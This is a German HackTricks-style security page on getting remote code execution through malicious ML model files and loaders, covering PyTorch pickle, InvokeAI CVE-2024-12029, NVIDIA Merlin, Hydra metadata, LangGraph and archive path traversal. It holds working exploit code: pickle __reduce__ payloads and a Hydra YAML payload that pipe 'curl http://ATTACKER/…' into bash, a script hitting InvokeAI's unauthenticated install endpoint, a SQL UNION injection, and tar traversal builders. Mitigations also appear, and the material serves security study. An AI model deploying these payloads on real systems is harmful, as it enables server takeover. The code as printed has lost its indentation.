# Modelle RCE

{{#include ../banners/hacktricks-training.md}}

## Laden von Modellen zu RCE

Machine-Learning-Modelle werden üblicherweise in verschiedenen Formaten geteilt, beispielsweise ONNX, TensorFlow, PyTorch usw. Diese Modelle können in die Rechner von Entwicklern oder in Produktionssysteme geladen werden, um sie zu verwenden. Normalerweise sollten die Modelle keinen bösartigen Code enthalten, aber es gibt Fälle, in denen das Modell dazu verwendet werden kann, beliebigen Code auf dem System auszuführen – entweder als beabsichtigte Funktion oder aufgrund einer Schwachstelle in der Bibliothek zum Laden von Modellen.

Zum Zeitpunkt der Erstellung sind dies einige Beispiele für diese Art von Schwachstellen:

| **Framework / Tool**        | **Schwachstelle (CVE, falls verfügbar)**                                                    | **RCE-Vektor**                                                                                                                           | **Referenzen**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Unsichere Deserialisierung in* `torch.load` **(CVE-2025-32434)**                                                              | Bösartiges pickle im Model-Checkpoint führt zur Codeausführung (umgeht die `weights_only`-Schutzmaßnahme)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + bösartiger Modelldownload führt zur Codeausführung; Java-Deserialisierungs-RCE in der Management-API                                        | |
| **NVIDIA Merlin Transformers4Rec** | Unsichere Checkpoint-Deserialisierung über `torch.load` **(CVE-2025-23298)**                                           | Nicht vertrauenswürdiger Checkpoint löst den Pickle-Reducer während `load_model_trainer_states_from_checkpoint` aus → Codeausführung im ML-Worker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + unsicherer MessagePack-Erweiterungshook **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | Vom Benutzer kontrollierter `filter`-Schlüssel injiziert SQL-/JSON-Path-Syntax, `UNION SELECT` erstellt eine gefälschte Checkpoint-Zeile, anschließend importiert und ruft die `msgpack`-Deserialisierung vom Angreifer ausgewählten Python-Code auf | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsicheres YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Das Laden eines Modells aus YAML verwendet `yaml.unsafe_load` (Codeausführung) <br> Das Laden eines Modells mit einer **Lambda**-Schicht führt beliebigen Python-Code aus          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite-Parsing)                                                                                          | Ein manipuliertes `.tflite`-Modell löst einen Integer Overflow → Heap-Korruption aus (potenzielle RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Das Laden eines Modells über `joblib.load` führt pickle mit der `__reduce__`-Payload des Angreifers aus                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsicheres `np.load`) *umstritten*                                                                              | Der Standard von `numpy.load` erlaubte Pickle-Object-Arrays – ein bösartiges `.npy/.npz` führt zur Codeausführung                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (Directory Traversal) <br> **CVE-2024-5187** (Tar Traversal)                                                    | Der Pfad zu den externen Gewichten eines ONNX-Modells kann das Verzeichnis verlassen (Lesen beliebiger Dateien) <br> Ein bösartiges ONNX-Modell-Tar kann beliebige Dateien überschreiben (führt zu RCE) | |
| ONNX Runtime (Designrisiko)  | *(Keine CVE)* Benutzerdefinierte ONNX-Operationen / Control Flow                                                                                    | Ein Modell mit einem benutzerdefinierten Operator erfordert das Laden von nativem Code des Angreifers; komplexe Modellgraphen missbrauchen die Logik, um unbeabsichtigte Berechnungen auszuführen   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (Path Traversal)                                                                                          | Die Verwendung der Model-Load-API mit aktiviertem `--model-control` ermöglicht relatives Path Traversal zum Schreiben von Dateien (z. B. Überschreiben von `.bashrc` für RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (mehrere Heap Overflows)                                                                         | Eine manipulierte GGUF-Modell-Datei verursacht Heap-Buffer-Overflows im Parser und ermöglicht dadurch beliebige Codeausführung auf dem Zielsystem                     | |
| **Keras (ältere Formate)**   | *(Keine neue CVE)* Veraltetes Keras-H5-Modell                                                                                         | Ein bösartiges HDF5-Modell (`.h5`) mit einer Lambda-Schicht führt beim Laden weiterhin Code aus (Keras `safe_mode` deckt das alte Format nicht ab – „Downgrade-Angriff“) | |
| **Andere** (allgemein)        | *Designfehler* – Pickle-Serialisierung                                                                                         | Viele ML-Tools (z. B. Pickle-basierte Modellformate und Python `pickle.load`) führen beliebigen, in Modelldateien eingebetteten Code aus, sofern dies nicht mitigiert wird | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Nicht vertrauenswürdige Metadaten, die an `hydra.utils.instantiate()` übergeben werden **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Vom Angreifer kontrollierte Modell-Metadaten/-Konfiguration setzen `_target_` auf einen beliebigen Callable (z. B. `builtins.exec`) → wird während des Ladens ausgeführt, selbst bei „sicheren“ Formaten (`.safetensors`, `.nemo`, `config.json` des Repositorys) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Darüber hinaus gibt es einige auf Python-Pickle basierende Modelle, wie die von [PyTorch](https://github.com/pytorch/pytorch/security) verwendeten, die beliebigen Code auf dem System ausführen können, wenn sie nicht mit `weights_only=True` geladen werden. Daher kann jedes Pickle-basierte Modell besonders anfällig für diese Art von Angriffen sein, selbst wenn es nicht in der obigen Tabelle aufgeführt ist.

### Hydra-Metadaten → RCE (funktioniert auch mit safetensors)

`hydra.utils.instantiate()` importiert und ruft jedes mit Punkten versehene `_target_` in einem Konfigurations-/Metadatenobjekt auf. Wenn Bibliotheken **nicht vertrauenswürdige Modell-Metadaten** an `instantiate()` übergeben, kann ein Angreifer einen Callable und Argumente bereitstellen, die unmittelbar während des Ladens des Modells ausgeführt werden (kein pickle erforderlich).<sup>[[12]](#references)[[13]](#references)</sup>

Beispiel für eine Payload (funktioniert in `model_config.yaml` von `.nemo`, `config.json` eines Repositorys oder in `__metadata__` innerhalb von `.safetensors`):
```yaml
_target_: builtins.exec
_args_:
- "import os; os.system('curl http://ATTACKER/x|bash')"
```
Wichtige Punkte:
- Wird vor der Modellinitialisierung in NeMo `restore_from/from_pretrained`, uni2TS HuggingFace coders und FlexTok loaders ausgelöst.
- Hydras String-Blocklist kann über alternative Importpfade (z. B. `enum.bltns.eval`) oder von der Anwendung aufgelöste Namen (z. B. `nemo.core.classes.common.os.system` → `posix`) umgangen werden.<sup>[[14]](#references)</sup>
- FlexTok analysiert außerdem stringifizierte Metadaten mit `ast.literal_eval`, wodurch vor dem Hydra-Aufruf ein DoS (übermäßiger CPU-/Speicherverbrauch) möglich ist.

### 🆕 InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI` ist eine beliebte Open-Source-Weboberfläche für Stable-Diffusion. Die Versionen **5.3.1 – 5.4.2** legen den REST-Endpunkt `/api/v2/models/install` offen, über den Benutzer Modelle von beliebigen URLs herunterladen und laden können.<sup>[[1]](#references)</sup>

Intern ruft der Endpunkt schließlich Folgendes auf:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Wenn die bereitgestellte Datei ein **PyTorch checkpoint (`*.ckpt`)** ist, führt `torch.load` eine **pickle deserialization** durch. Da der Inhalt direkt von der vom Benutzer kontrollierten URL stammt, kann ein Angreifer ein schädliches Objekt mit einer benutzerdefinierten `__reduce__`-Methode in den checkpoint einbetten; die Methode wird **während der Deserialisierung** ausgeführt und ermöglicht dadurch **remote code execution (RCE)** auf dem InvokeAI-Server.

Die Schwachstelle wurde als **CVE-2024-12029** eingestuft (CVSS 9.8, EPSS 61.17 %).

#### Exploitation-Walk-through

1. Erstellen eines schädlichen checkpoint:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Hosten Sie `payload.ckpt` auf einem von Ihnen kontrollierten HTTP-Server (z. B. `http://ATTACKER/payload.ckpt`).
3. Lösen Sie den verwundbaren Endpunkt aus (keine Authentifizierung erforderlich):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Wenn InvokeAI die Datei herunterlädt, ruft es `torch.load()` auf → das `os.system`-Gadget wird ausgeführt und der Angreifer erhält Codeausführung im Kontext des InvokeAI-Prozesses.

Fertiger Exploit: Das **Metasploit**-Modul `exploit/linux/http/invokeai_rce_cve_2024_12029` automatisiert den gesamten Ablauf.<sup>[[3]](#references)</sup>

#### Voraussetzungen

•  InvokeAI 5.3.1-5.4.2 (Scan-Flag standardmäßig **false**)
•  `/api/v2/models/install` muss für den Angreifer erreichbar sein
•  Der Prozess benötigt Berechtigungen zum Ausführen von Shell-Befehlen

#### Mitigations

* Auf **InvokeAI ≥ 5.4.3** aktualisieren – der Patch setzt standardmäßig `scan=True` und führt vor der Deserialisierung einen Malware-Scan durch.<sup>[[2]](#references)</sup>
* Beim programmgesteuerten Laden von Checkpoints `torch.load(file, weights_only=True)` oder den neuen [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security)-Helper verwenden.
* Allow-lists / Signaturen für Model-Quellen erzwingen und den Service mit den geringstmöglichen Berechtigungen ausführen.

> ⚠️ Denke daran, dass jedes auf Python-Pickle basierende Format (einschließlich vieler `.pt`-, `.pkl`-, `.ckpt`- und `.pth`-Dateien) grundsätzlich unsicher ist, wenn es aus nicht vertrauenswürdigen Quellen deserialisiert wird.

---

Beispiel für eine Ad-hoc-Mitigation, falls ältere InvokeAI-Versionen hinter einem Reverse Proxy weiter betrieben werden müssen:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE via unsicheres `torch.load` (CVE-2025-23298)

NVIDIAs Transformers4Rec (Teil von Merlin) stellte einen unsicheren Checkpoint-Loader bereit, der `torch.load()` direkt mit vom Benutzer bereitgestellten Pfaden aufrief. Da `torch.load` auf Python-`pickle` basiert, kann ein von einem Angreifer kontrollierter Checkpoint über einen Reducer während der Deserialisierung beliebigen Code ausführen.<sup>[[5]](#references)</sup>

Verwundbarer Pfad (vor dem Fix): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Warum dies zu RCE führt: In Python-`pickle` kann ein Objekt einen Reducer (`__reduce__`/`__setstate__`) definieren, der eine Callable und Argumente zurückgibt. Die Callable wird während des Unpickling ausgeführt. Wenn ein solches Objekt in einem Checkpoint vorhanden ist, wird es ausgeführt, bevor irgendwelche Weights verwendet werden.

Minimales Beispiel für einen bösartigen Checkpoint:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Liefervektoren und Blast Radius:
- Trojanisierte Checkpoints/Modelle, die über Repos, Buckets oder artifact registries geteilt werden
- Automatisierte Resume-/Deploy-Pipelines, die Checkpoints automatisch laden
- Die Ausführung findet innerhalb von Training-/Inference-Workern statt, häufig mit erhöhten Berechtigungen (z. B. als root in Containern)

Behebung: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) ersetzte das direkte `torch.load()` durch einen eingeschränkten, allow-listed Deserializer, der in `transformers4rec/utils/serialization.py` implementiert wurde. Der neue Loader validiert Typen/Felder und verhindert, dass während des Ladens beliebige Callables aufgerufen werden.<sup>[[7]](#references)</sup>

Spezifische defensive Hinweise für PyTorch-Checkpoints:
- Untrusted Daten nicht unpicklen. Wenn möglich, nicht ausführbare Formate wie [Safetensors](https://huggingface.co/docs/safetensors/index) oder ONNX bevorzugen.
- Wenn du PyTorch-Serialisierung verwenden musst, sicherstellen, dass `weights_only=True` verwendet wird (in neueren PyTorch-Versionen unterstützt), oder einen benutzerdefinierten allow-listed Unpickler ähnlich dem Transformers4Rec-Patch verwenden.<sup>[[4]](#references)</sup>
- Model-Provenance/Signaturen erzwingen und die Deserialisierung sandboxen (seccomp/AppArmor; non-root user; eingeschränktes FS und kein Network-Egress).
- Auf unerwartete Child-Prozesse von ML-Services zum Zeitpunkt des Checkpoint-Ladens überwachen; die Verwendung von `torch.load()`/`pickle` nachverfolgen.

POC- sowie Vulnerable-/Patch-Referenzen:<sup>[[8]](#references)[[9]](#references)[[10]](#references)</sup>
- Vulnerable Pre-Patch-Loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- Malicious-Checkpoint-POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- Post-Patch-Loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## Beispiel – Erstellen eines bösartigen PyTorch-Modells

- Modell erstellen:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Das Modell laden:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserialization von Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent’s FaceDetection-DSFD stellt einen `resnet`-endpoint bereit, der vom Benutzer kontrollierte Daten deserialisiert. ZDI bestätigte, dass ein Remote-Angreifer ein Opfer dazu bringen kann, eine bösartige Seite/Datei zu laden, diese einen manipulierten serialisierten Blob an diesen endpoint senden zu lassen und dadurch eine Deserialisierung als `root` auszulösen, was zu einer vollständigen Kompromittierung führt.

Der Exploit-Ablauf entspricht dem typischen pickle-Missbrauch:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
Jedes Gadget, das während der Deserialisierung erreichbar ist (Konstruktoren, `__setstate__`, Framework-Callbacks usw.), kann auf dieselbe Weise weaponized werden, unabhängig davon, ob der Transport über HTTP, WebSocket oder eine in einem überwachten Verzeichnis abgelegte Datei erfolgte.



### LangGraph checkpointer SQLi → MessagePack RCE

Diese Angriffskette ist interessant, weil der Angreifer **keine bösartige Modelldatei hochladen muss**. Stattdessen stellt die Anwendung eine **Persistence API für AI-Agenten** (`get_state_history(..., filter=...)`) bereit, und Benutzereingaben erreichen den Query Builder des Checkpointers.

#### 1. Strukturelle SQLi in Metadata-Filtern

Ein verwundbares SQLite-Muster sah so aus:
```python
for query_key, query_value in filter.items():
operator, param_value = _where_value(query_value)
predicates.append(
f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
)
```
Der Wert wird später gebunden, aber `query_key` wird in den **JSON path string** eingefügt. Daher bricht ein `'` innerhalb des Dictionary-Keys aus `'$.{query_key}'` aus und injiziert SQL. Dieselbe Erkenntnis gilt für **JSON paths, identifiers, operators, `LIMIT` und TTL fields**: Platzhalter schützen nur Werte, nicht die strukturelle Query-Syntax.

#### 2. `UNION SELECT` kann auf nachgelagerte Sinks abzielen, nicht nur auf Datendiebstahl

Die Query gibt `type` und serialisierte `checkpoint`-Bytes zurück, die später wie folgt verarbeitet werden:
```python
self.serde.loads_typed((type, checkpoint))
```
Das bedeutet, dass eine SQLi in der `WHERE`-Klausel eine **gefälschte Ergebniszeile** einschleusen kann:
```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```
Wenn späterer Code eine ausgewählte Spalte parst, deserialisiert, schreibt oder ausführt, ordne diese Spalten ihren Sinks zu. In diesem Fall verwandelt die gefälschte Zeile SQLi in **attacker-gesteuerte Deserialisierung**.

#### 3. Unsichere MessagePack-Extension-Hooks entsprechen Code-Gadgets

LangGraphs `msgpack`-Pfad verwendete einen benutzerdefinierten Extension-Hook, der ein verschachteltes Tupel entpackte und Folgendes ausführte:
```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```
Ein MessagePack-Erweiterungsobjekt, das etwas Äquivalentes zu `("os", "system", "id > /tmp/pwned")` codiert, importiert `os`, löst `system` auf und führt den Befehl aus. Bei der Überprüfung von KI-Frameworks sollten **benutzerdefinierte MessagePack/JSON/pickle-Reviver** auf dynamische Imports, Reflection oder das beliebige Dispatchen von Callables untersucht werden.

#### 4. Praktisches Audit-Muster für Agent-Frameworks

Überprüfe alle benutzerkontrollierten Eingaben, die folgende Komponenten erreichen:
- APIs zum Auflisten von State-History / Memory / Replay / Checkpoints
- strukturierte Filter-Builder, die SQL- oder Redis-Query-Fragmente erzeugen
- benutzerdefinierte Deserialisierer (`pickle`, `msgpack`, `json`-Object-Hooks, YAML-Konstruktoren)
- Recovery-Pfade, die den aus der Persistence Layer zurückgegebenen Rows vertrauen

Diese spezifische Chain betraf selbst gehostete LangGraph-Deployments mit **SQLite**- oder **Redis**-Checkpointern, wenn nicht vertrauenswürdige Benutzer `filter` kontrollieren konnten. In der Disclosure wurden folgende gepatchte Versionen genannt: `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+` und `langgraph-checkpoint 4.0.1+`.<sup>[[15]](#references)</sup>

## Models zu Path Traversal

Wie in [**diesem Blogpost**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties) kommentiert, basieren die von verschiedenen KI-Frameworks verwendeten Model-Formate größtenteils auf Archiven, üblicherweise `.zip`. Daher könnte es möglich sein, diese Formate für Path-Traversal-Angriffe auszunutzen, wodurch beliebige Dateien vom System gelesen werden können, auf dem das Model geladen wird.<sup>[[16]](#references)</sup>

Mit dem folgenden Code kann beispielsweise ein Model erstellt werden, das beim Laden eine Datei im Verzeichnis `/tmp` erstellt:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Oder mit dem folgenden Code können Sie ein Modell erstellen, das beim Laden einen Symlink zum Verzeichnis `/tmp` erstellt:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Tiefenanalyse: Keras-.keras-Deserialisierung und Gadget-Suche

Eine gezielte Anleitung zu den Interna von .keras, RCE über Lambda-Layer, dem Problem des beliebigen Imports in ≤ 3.8 und der Suche nach Gadgets innerhalb der allowlist findest du unter:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## Referenzen

- [1] [OffSec blog – „CVE-2024-12029 – Deserialisierung nicht vertrauenswürdiger Daten in InvokeAI“](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [InvokeAI-Patch-Commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Dokumentation des Rapid7-Metasploit-Moduls](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – Sicherheitsüberlegungen für torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [ZDI blog – „CVE-2025-23298: Remote Code Execution in NVIDIA Merlin“](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [ZDI-Advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Transformers4Rec-Patch-Commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [Verwundbarer Loader vor dem Patch (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [PoC für einen bösartigen Checkpoint (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [Loader nach dem Patch (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – Remote Code Execution mit modernen AI/ML-Formaten und Libraries](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Hydra-Dokumentation zu instantiate](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Hydra-Block-list-Commit (Warnung vor RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – Von SQLi zu RCE: Ausnutzung von LangGraphs Checkpointer](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Archive-Slip-Bugs in hochwertige AI/ML-Bounties umwandeln](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)

{{#include ../banners/hacktricks-training.md}}
